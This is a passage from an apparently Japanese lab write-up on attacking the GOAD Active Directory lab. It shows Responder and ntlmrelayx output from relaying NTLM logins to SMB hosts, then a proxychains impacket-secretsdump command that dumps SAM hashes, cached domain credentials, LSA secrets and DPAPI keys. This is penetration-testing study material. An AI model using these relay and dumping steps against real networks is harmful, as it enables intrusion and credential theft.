</span></span><span class=line><span class=cl>    <span class=nx>DCE</span><span class=o>-</span><span class=nx>RPC</span> <span class=nx>server</span>             <span class=p>[</span><span class=nx>ON</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>WinRM</span> <span class=nx>server</span>               <span class=p>[</span><span class=nx>ON</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>SNMP</span> <span class=nx>server</span>                <span class=p>[</span><span class=nx>OFF</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>HTTP</span> <span class=nx>Options</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=nx>Always</span> <span class=nx>serving</span> <span class=nx>EXE</span>         <span class=p>[</span><span class=nx>OFF</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>Serving</span> <span class=nx>EXE</span>                <span class=p>[</span><span class=nx>OFF</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>Serving</span> <span class=nx>HTML</span>               <span class=p>[</span><span class=nx>OFF</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>Upstream</span> <span class=nb>Proxy</span>             <span class=p>[</span><span class=nx>OFF</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Poisoning</span> <span class=nx>Options</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=nx>Analyze</span> <span class=nx>Mode</span>               <span class=p>[</span><span class=nx>OFF</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>Force</span> <span class=nx>WPAD</span> <span class=nx>auth</span>            <span class=p>[</span><span class=nx>OFF</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>Force</span> <span class=nx>Basic</span> <span class=nx>Auth</span>           <span class=p>[</span><span class=nx>OFF</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>Force</span> <span class=nx>LM</span> <span class=nx>downgrade</span>         <span class=p>[</span><span class=nx>OFF</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>Force</span> <span class=nx>ESS</span> <span class=nx>downgrade</span>        <span class=p>[</span><span class=nx>OFF</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Generic</span> <span class=nx>Options</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=nx>Responder</span> <span class=nx>NIC</span>              <span class=p>[</span><span class=nx>eth1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>Responder</span> <span class=nx>IP</span>               <span class=p>[</span><span class=mf>192.168.56.104</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>Responder</span> <span class=nx>IPv6</span>             <span class=p>[</span><span class=nx>fe80</span><span class=o>::</span><span class=mi>5</span><span class=nx>af0</span><span class=o>:</span><span class=mi>79</span><span class=o>:</span><span class=nx>dd52</span><span class=o>:</span><span class=mi>80</span><span class=nx>d1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>Challenge</span> <span class=nx>set</span>              <span class=p>[</span><span class=nx>random</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>Don</span><span class=s1>&#39;t Respond To Names     [&#39;</span><span class=nx>ISATAP</span><span class=s1>&#39;, &#39;</span><span class=nx>ISATAP</span><span class=p>.</span><span class=nx>LOCAL</span><span class=err>&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Current</span> <span class=nx>Session</span> <span class=nx>Variables</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=nx>Responder</span> <span class=nx>Machine</span> <span class=nx>Name</span>     <span class=p>[</span><span class=nx>WIN</span><span class=o>-</span><span class=nx>E217ZFS7CUP</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>Responder</span> <span class=nx>Domain</span> <span class=nx>Name</span>      <span class=p>[</span><span class=nx>DCK5</span><span class=p>.</span><span class=nx>LOCAL</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>Responder</span> <span class=nx>DCE</span><span class=o>-</span><span class=nx>RPC</span> <span class=nx>Port</span>     <span class=p>[</span><span class=mi>47652</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Listening</span> <span class=k>for</span> <span class=nx>events</span><span class=p>...</span>
</span></span></code></pre></div><p>ntlmrelayxでしばらく待つとこんな内容が出力される</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>ntlmrelayx</span><span class=o>&gt;</span> <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Received</span> <span class=nx>connection</span> <span class=nx>from</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>eddard</span><span class=p>.</span><span class=nx>stark</span> <span class=nx>at</span> <span class=nx>WINTERFELL</span><span class=p>,</span> <span class=nx>connection</span> <span class=nx>will</span> <span class=nx>be</span> <span class=nx>relayed</span> <span class=nx>after</span> <span class=nx>re</span><span class=o>-</span><span class=nx>authentication</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>SMBD</span><span class=o>-</span><span class=nx>Thread</span><span class=o>-</span><span class=mi>13</span> <span class=p>(</span><span class=nx>process_request_thread</span><span class=p>)</span><span class=o>:</span> <span class=nx>Connection</span> <span class=nx>from</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>EDDARD</span><span class=p>.</span><span class=nx>STARK</span><span class=err>@</span><span class=mf>192.168.56.11</span> <span class=nx>controlled</span><span class=p>,</span> <span class=nx>attacking</span> <span class=nx>target</span> <span class=nx>smb</span><span class=o>:</span><span class=c1>//192.168.56.23
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Authenticating</span> <span class=nx>against</span> <span class=nx>smb</span><span class=o>:</span><span class=c1>//192.168.56.23 as NORTH/EDDARD.STARK SUCCEED
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>SOCKS</span><span class=o>:</span> <span class=nx>Adding</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>EDDARD</span><span class=p>.</span><span class=nx>STARK</span><span class=err>@</span><span class=mf>192.168.56.23</span><span class=p>(</span><span class=mi>445</span><span class=p>)</span> <span class=nx>to</span> <span class=nx>active</span> <span class=nx>SOCKS</span> <span class=nx>connection</span><span class=p>.</span> <span class=nx>Enjoy</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>SMBD</span><span class=o>-</span><span class=nx>Thread</span><span class=o>-</span><span class=mi>13</span> <span class=p>(</span><span class=nx>process_request_thread</span><span class=p>)</span><span class=o>:</span> <span class=nx>Connection</span> <span class=nx>from</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>EDDARD</span><span class=p>.</span><span class=nx>STARK</span><span class=err>@</span><span class=mf>192.168.56.11</span> <span class=nx>controlled</span><span class=p>,</span> <span class=nx>attacking</span> <span class=nx>target</span> <span class=nx>smb</span><span class=o>:</span><span class=c1>//192.168.56.22
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Authenticating</span> <span class=nx>against</span> <span class=nx>smb</span><span class=o>:</span><span class=c1>//192.168.56.22 as NORTH/EDDARD.STARK SUCCEED
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>SOCKS</span><span class=o>:</span> <span class=nx>Adding</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>EDDARD</span><span class=p>.</span><span class=nx>STARK</span><span class=err>@</span><span class=mf>192.168.56.22</span><span class=p>(</span><span class=mi>445</span><span class=p>)</span> <span class=nx>to</span> <span class=nx>active</span> <span class=nx>SOCKS</span> <span class=nx>connection</span><span class=p>.</span> <span class=nx>Enjoy</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>SMBD</span><span class=o>-</span><span class=nx>Thread</span><span class=o>-</span><span class=mi>13</span> <span class=p>(</span><span class=nx>process_request_thread</span><span class=p>)</span><span class=o>:</span> <span class=nx>Connection</span> <span class=nx>from</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>EDDARD</span><span class=p>.</span><span class=nx>STARK</span><span class=err>@</span><span class=mf>192.168.56.11</span> <span class=nx>controlled</span><span class=p>,</span> <span class=nx>but</span> <span class=nx>there</span> <span class=nx>are</span> <span class=nx>no</span> <span class=nx>more</span> <span class=nx>targets</span> <span class=nx>left</span><span class=o>!</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Received</span> <span class=nx>connection</span> <span class=nx>from</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>eddard</span><span class=p>.</span><span class=nx>stark</span> <span class=nx>at</span> <span class=nx>WINTERFELL</span><span class=p>,</span> <span class=nx>connection</span> <span class=nx>will</span> <span class=nx>be</span> <span class=nx>relayed</span> <span class=nx>after</span> <span class=nx>re</span><span class=o>-</span><span class=nx>authentication</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Received</span> <span class=nx>connection</span> <span class=nx>from</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>eddard</span><span class=p>.</span><span class=nx>stark</span> <span class=nx>at</span> <span class=nx>WINTERFELL</span><span class=p>,</span> <span class=nx>connection</span> <span class=nx>will</span> <span class=nx>be</span> <span class=nx>relayed</span> <span class=nx>after</span> <span class=nx>re</span><span class=o>-</span><span class=nx>authentication</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>SMBD</span><span class=o>-</span><span class=nx>Thread</span><span class=o>-</span><span class=mi>14</span> <span class=p>(</span><span class=nx>process_request_thread</span><span class=p>)</span><span class=o>:</span> <span class=nx>Connection</span> <span class=nx>from</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>EDDARD</span><span class=p>.</span><span class=nx>STARK</span><span class=err>@</span><span class=mf>192.168.56.11</span> <span class=nx>controlled</span><span class=p>,</span> <span class=nx>but</span> <span class=nx>there</span> <span class=nx>are</span> <span class=nx>no</span> <span class=nx>more</span> <span class=nx>targets</span> <span class=nx>left</span><span class=o>!</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Received</span> <span class=nx>connection</span> <span class=nx>from</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>eddard</span><span class=p>.</span><span class=nx>stark</span> <span class=nx>at</span> <span class=nx>WINTERFELL</span><span class=p>,</span> <span class=nx>connection</span> <span class=nx>will</span> <span class=nx>be</span> <span class=nx>relayed</span> <span class=nx>after</span> <span class=nx>re</span><span class=o>-</span><span class=nx>authentication</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Received</span> <span class=nx>connection</span> <span class=nx>from</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>robb</span><span class=p>.</span><span class=nx>stark</span> <span class=nx>at</span> <span class=nx>WINTERFELL</span><span class=p>,</span> <span class=nx>connection</span> <span class=nx>will</span> <span class=nx>be</span> <span class=nx>relayed</span> <span class=nx>after</span> <span class=nx>re</span><span class=o>-</span><span class=nx>authentication</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>SMBD</span><span class=o>-</span><span class=nx>Thread</span><span class=o>-</span><span class=mi>15</span> <span class=p>(</span><span class=nx>process_request_thread</span><span class=p>)</span><span class=o>:</span> <span class=nx>Connection</span> <span class=nx>from</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>ROBB</span><span class=p>.</span><span class=nx>STARK</span><span class=err>@</span><span class=mf>192.168.56.11</span> <span class=nx>controlled</span><span class=p>,</span> <span class=nx>attacking</span> <span class=nx>target</span> <span class=nx>smb</span><span class=o>:</span><span class=c1>//192.168.56.23
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Authenticating</span> <span class=nx>against</span> <span class=nx>smb</span><span class=o>:</span><span class=c1>//192.168.56.23 as NORTH/ROBB.STARK SUCCEED
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>SOCKS</span><span class=o>:</span> <span class=nx>Adding</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>ROBB</span><span class=p>.</span><span class=nx>STARK</span><span class=err>@</span><span class=mf>192.168.56.23</span><span class=p>(</span><span class=mi>445</span><span class=p>)</span> <span class=nx>to</span> <span class=nx>active</span> <span class=nx>SOCKS</span> <span class=nx>connection</span><span class=p>.</span> <span class=nx>Enjoy</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>SMBD</span><span class=o>-</span><span class=nx>Thread</span><span class=o>-</span><span class=mi>15</span> <span class=p>(</span><span class=nx>process_request_thread</span><span class=p>)</span><span class=o>:</span> <span class=nx>Connection</span> <span class=nx>from</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>ROBB</span><span class=p>.</span><span class=nx>STARK</span><span class=err>@</span><span class=mf>192.168.56.11</span> <span class=nx>controlled</span><span class=p>,</span> <span class=nx>attacking</span> <span class=nx>target</span> <span class=nx>smb</span><span class=o>:</span><span class=c1>//192.168.56.22
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Authenticating</span> <span class=nx>against</span> <span class=nx>smb</span><span class=o>:</span><span class=c1>//192.168.56.22 as NORTH/ROBB.STARK SUCCEED
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>SOCKS</span><span class=o>:</span> <span class=nx>Adding</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>ROBB</span><span class=p>.</span><span class=nx>STARK</span><span class=err>@</span><span class=mf>192.168.56.22</span><span class=p>(</span><span class=mi>445</span><span class=p>)</span> <span class=nx>to</span> <span class=nx>active</span> <span class=nx>SOCKS</span> <span class=nx>connection</span><span class=p>.</span> <span class=nx>Enjoy</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>SMBD</span><span class=o>-</span><span class=nx>Thread</span><span class=o>-</span><span class=mi>15</span> <span class=p>(</span><span class=nx>process_request_thread</span><span class=p>)</span><span class=o>:</span> <span class=nx>Connection</span> <span class=nx>from</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>ROBB</span><span class=p>.</span><span class=nx>STARK</span><span class=err>@</span><span class=mf>192.168.56.11</span> <span class=nx>controlled</span><span class=p>,</span> <span class=nx>but</span> <span class=nx>there</span> <span class=nx>are</span> <span class=nx>no</span> <span class=nx>more</span> <span class=nx>targets</span> <span class=nx>left</span><span class=o>!</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Received</span> <span class=nx>connection</span> <span class=nx>from</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>robb</span><span class=p>.</span><span class=nx>stark</span> <span class=nx>at</span> <span class=nx>WINTERFELL</span><span class=p>,</span> <span class=nx>connection</span> <span class=nx>will</span> <span class=nx>be</span> <span class=nx>relayed</span> <span class=nx>after</span> <span class=nx>re</span><span class=o>-</span><span class=nx>authentication</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Received</span> <span class=nx>connection</span> <span class=nx>from</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>robb</span><span class=p>.</span><span class=nx>stark</span> <span class=nx>at</span> <span class=nx>WINTERFELL</span><span class=p>,</span> <span class=nx>connection</span> <span class=nx>will</span> <span class=nx>be</span> <span class=nx>relayed</span> <span class=nx>after</span> <span class=nx>re</span><span class=o>-</span><span class=nx>authentication</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>SMBD</span><span class=o>-</span><span class=nx>Thread</span><span class=o>-</span><span class=mi>16</span> <span class=p>(</span><span class=nx>process_request_thread</span><span class=p>)</span><span class=o>:</span> <span class=nx>Connection</span> <span class=nx>from</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>ROBB</span><span class=p>.</span><span class=nx>STARK</span><span class=err>@</span><span class=mf>192.168.56.11</span> <span class=nx>controlled</span><span class=p>,</span> <span class=nx>but</span> <span class=nx>there</span> <span class=nx>are</span> <span class=nx>no</span> <span class=nx>more</span> <span class=nx>targets</span> <span class=nx>left</span><span class=o>!</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Received</span> <span class=nx>connection</span> <span class=nx>from</span> <span class=nx>NORTH</span><span class=o>/</span><span class=nx>robb</span><span class=p>.</span><span class=nx>stark</span> <span class=nx>at</span> <span class=nx>WINTERFELL</span><span class=p>,</span> <span class=nx>connection</span> <span class=nx>will</span> <span class=nx>be</span> <span class=nx>relayed</span> <span class=nx>after</span> <span class=nx>re</span><span class=o>-</span><span class=nx>authentication</span>
</span></span></code></pre></div><p>というわけで中間者攻撃しつつsocksプロキシを使えるようになった</p><p>それでもってproxychainsで繋ぎつつsecretsdumpを走らせる</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=err>/goad]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>proxychains</span> <span class=nx>impacket</span><span class=o>-</span><span class=nx>secretsdump</span> <span class=o>-</span><span class=nx>no</span><span class=o>-</span><span class=nx>pass</span> <span class=s1>&#39;NORTH&#39;</span><span class=o>/</span><span class=s1>&#39;EDDARD.STARK&#39;</span><span class=err>@</span><span class=s1>&#39;192.168.56.22&#39;</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>proxychains</span><span class=p>]</span> <span class=nx>config</span> <span class=nx>file</span> <span class=nx>found</span><span class=o>:</span> <span class=err>/etc/proxychains4.conf</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>proxychains</span><span class=p>]</span> <span class=nx>preloading</span> <span class=o>/</span><span class=nx>usr</span><span class=o>/</span><span class=nx>lib</span><span class=o>/</span><span class=nx>x86_64</span><span class=o>-</span><span class=nx>linux</span><span class=o>-</span><span class=nx>gnu</span><span class=o>/</span><span class=nx>libproxychains</span><span class=p>.</span><span class=nx>so</span><span class=mf>.4</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>proxychains</span><span class=p>]</span> <span class=nx>DLL</span> <span class=nx>init</span><span class=o>:</span> <span class=nx>proxychains</span><span class=o>-</span><span class=nx>ng</span> <span class=mf>4.17</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>proxychains</span><span class=p>]</span> <span class=nx>DLL</span> <span class=nx>init</span><span class=o>:</span> <span class=nx>proxychains</span><span class=o>-</span><span class=nx>ng</span> <span class=mf>4.17</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>proxychains</span><span class=p>]</span> <span class=nx>DLL</span> <span class=nx>init</span><span class=o>:</span> <span class=nx>proxychains</span><span class=o>-</span><span class=nx>ng</span> <span class=mf>4.17</span>
</span></span><span class=line><span class=cl><span class=nx>Impacket</span> <span class=nx>v0</span><span class=mf>.12.0</span><span class=p>.</span><span class=nx>dev1</span> <span class=o>-</span> <span class=nx>Copyright</span> <span class=mi>2023</span> <span class=nx>Fortra</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>proxychains</span><span class=p>]</span> <span class=nx>Strict</span> <span class=nx>chain</span>  <span class=p>...</span>  <span class=mf>127.0.0.1</span><span class=o>:</span><span class=mi>1080</span>  <span class=p>...</span>  <span class=mf>192.168.56.22</span><span class=o>:</span><span class=mi>445</span>  <span class=p>...</span>  <span class=nx>OK</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Service</span> <span class=nx>RemoteRegistry</span> <span class=nx>is</span> <span class=k>in</span> <span class=nx>stopped</span> <span class=nx>state</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Starting</span> <span class=nx>service</span> <span class=nx>RemoteRegistry</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Target</span> <span class=nx>system</span> <span class=nx>bootKey</span><span class=o>:</span> <span class=mh>0xe726c3449239522103313bbfa17ae832</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Dumping</span> <span class=nx>local</span> <span class=nx>SAM</span> <span class=nx>hashes</span> <span class=p>(</span><span class=nx>uid</span><span class=o>:</span><span class=nx>rid</span><span class=o>:</span><span class=nx>lmhash</span><span class=o>:</span><span class=nx>nthash</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>Administrator</span><span class=o>:</span><span class=mi>500</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=nx>dbd13e1c4e338284ac4e9874f7de6ef4</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>Guest</span><span class=o>:</span><span class=mi>501</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>31</span><span class=nx>d6cfe0d16ae931b73c59d7e0c089c0</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>DefaultAccount</span><span class=o>:</span><span class=mi>503</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>31</span><span class=nx>d6cfe0d16ae931b73c59d7e0c089c0</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>WDAGUtilityAccount</span><span class=o>:</span><span class=mi>504</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>4363</span><span class=nx>b6dc0c95588964884d7e1dfea1f7</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>vagrant</span><span class=o>:</span><span class=mi>1000</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=nx>e02bc503339d51f71d913c245d35b50b</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Dumping</span> <span class=nx>cached</span> <span class=nx>domain</span> <span class=nx>logon</span> <span class=nx>information</span> <span class=p>(</span><span class=nx>domain</span><span class=o>/</span><span class=nx>username</span><span class=o>:</span><span class=nx>hash</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL</span><span class=o>/</span><span class=nx>sql_svc</span><span class=o>:</span><span class=nx>$DCC2$10240</span><span class=err>#</span><span class=nx>sql_svc</span><span class=err>#</span><span class=mi>89</span><span class=nx>e701ebbd305e4f5380c5150494584a</span><span class=o>:</span> <span class=p>(</span><span class=mi>2024</span><span class=o>-</span><span class=mi>08</span><span class=o>-</span><span class=mi>11</span> <span class=mi>04</span><span class=o>:</span><span class=mi>00</span><span class=o>:</span><span class=mi>35</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL</span><span class=o>/</span><span class=nx>robb</span><span class=p>.</span><span class=nx>stark</span><span class=o>:</span><span class=nx>$DCC2$10240</span><span class=err>#</span><span class=nx>robb</span><span class=p>.</span><span class=nx>stark</span><span class=err>#</span><span class=nx>f19bfb9b10ba923f2e28b733e5dd1405</span><span class=o>:</span> <span class=p>(</span><span class=mi>2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>13</span> <span class=mi>02</span><span class=o>:</span><span class=mi>15</span><span class=o>:</span><span class=mi>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Dumping</span> <span class=nx>LSA</span> <span class=nx>Secrets</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>$MACHINE</span><span class=p>.</span><span class=nx>ACC</span> 
</span></span><span class=line><span class=cl><span class=nx>NORTH</span><span class=err>\</span><span class=nx>CASTELBLACK$</span><span class=o>:</span><span class=nx>aes256</span><span class=o>-</span><span class=nx>cts</span><span class=o>-</span><span class=nx>hmac</span><span class=o>-</span><span class=nx>sha1</span><span class=o>-</span><span class=mi>96</span><span class=o>:</span><span class=mi>7</span><span class=nx>f588d89c8e329850eb2cfcb6f20dcc68346a58b33748b8ba3762f365bfd3857</span>
</span></span><span class=line><span class=cl><span class=nx>NORTH</span><span class=err>\</span><span class=nx>CASTELBLACK$</span><span class=o>:</span><span class=nx>aes128</span><span class=o>-</span><span class=nx>cts</span><span class=o>-</span><span class=nx>hmac</span><span class=o>-</span><span class=nx>sha1</span><span class=o>-</span><span class=mi>96</span><span class=o>:</span><span class=mi>7171432588</span><span class=nx>c012604326db931b606ad9</span>
</span></span><span class=line><span class=cl><span class=nx>NORTH</span><span class=err>\</span><span class=nx>CASTELBLACK$</span><span class=o>:</span><span class=nx>des</span><span class=o>-</span><span class=nx>cbc</span><span class=o>-</span><span class=nx>md5</span><span class=o>:</span><span class=mi>08</span><span class=nx>f707b33d52a2b6</span>
</span></span><span class=line><span class=cl><span class=nx>NORTH</span><span class=err>\</span><span class=nx>CASTELBLACK$</span><span class=o>:</span><span class=nx>plain_password_hex</span><span class=o>:</span><span class=mi>1111806</span><span class=nx>e0bf8db391cb1c02c6411c34bce4b042253b862a6baa74e0a7654780999ff01c1d53d598ed08f168c35ca13303583a23343a965fa4b8f72afdfb63371b8f3d6aeb45d7e1e3c3f91d4f1eea5977a41030a4e83603b6c4d78db03728bc79b041b02fc53943f14ce014ed7fa7c335c7e150467b8dba0023256d6f376150c45c7bde0635e2d1ed53848685f8addd100827f320d24d0ca9102a6ca7824ecc7994f0ed433c325a7e72d20960ce3797570272218fbfb8868fba0037ace07459c34eb05cf05c00b9a78082676e45a1283da88772cb7881a96312998f49b2b92a4575a46be4a2d839a0efd7d6f5d0b30f0</span>
</span></span><span class=line><span class=cl><span class=nx>NORTH</span><span class=err>\</span><span class=nx>CASTELBLACK$</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>20425334</span><span class=nx>e9f78d883485696487ab1b67</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>DPAPI_SYSTEM</span> 
</span></span><span class=line><span class=cl><span class=nx>dpapi_machinekey</span><span class=o>:</span><span class=mh>0x130872a1a24387df59aae05e7d4ca0c98dd5535d</span>
</span></span><span class=line><span class=cl><span class=nx>dpapi_userkey</span><span class=o>:</span><span class=mh>0x86a53690af0fcd4490280ede099bc684e11a6918</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>NL$KM</span> 
</span></span><span class=line><span class=cl> <span class=mi>0000</span>   <span class=mi>22</span> <span class=mi>34</span> <span class=mi>01</span> <span class=mi>76</span> <span class=mi>01</span> <span class=mi>70</span> <span class=mi>30</span> <span class=mi>93</span>  <span class=mi>88</span> <span class=nx>A7</span> <span class=mi>6</span><span class=nx>B</span> <span class=nx>B2</span> <span class=mi>87</span> <span class=mi>43</span> <span class=mi>59</span> <span class=mi>69</span>   <span class=s2>&#34;4.v.p0...k..CYi
</span></span></span><span class=line><span class=cl><span class=s2> 0010   0E 41 BD 22 0A 0C CC 23  3A 5B B6 74 CB 90 D6 35   .A.&#34;</span><span class=p>...</span><span class=err>#</span><span class=o>:</span><span class=p>[.</span><span class=nx>t</span><span class=p>...</span><span class=mi>5</span>
</span></span><span class=line><span class=cl> <span class=mi>0020</span>   <span class=mi>14</span> <span class=nx>CA</span> <span class=nx>D8</span> <span class=mi>45</span> <span class=mi>4</span><span class=nx>A</span> <span class=nx>F0</span> <span class=nx>DB</span> <span class=mi>72</span>  <span class=nx>D5</span> <span class=nx>CF</span> <span class=mi>3</span><span class=nx>B</span> <span class=nx>A1</span> <span class=nx>ED</span> <span class=mi>7</span><span class=nx>F</span> <span class=mi>3</span><span class=nx>A</span> <span class=mi>98</span>   <span class=p>...</span><span class=nx>EJ</span><span class=p>..</span><span class=nx>r</span><span class=p>..;...</span><span class=o>:</span><span class=p>.</span>
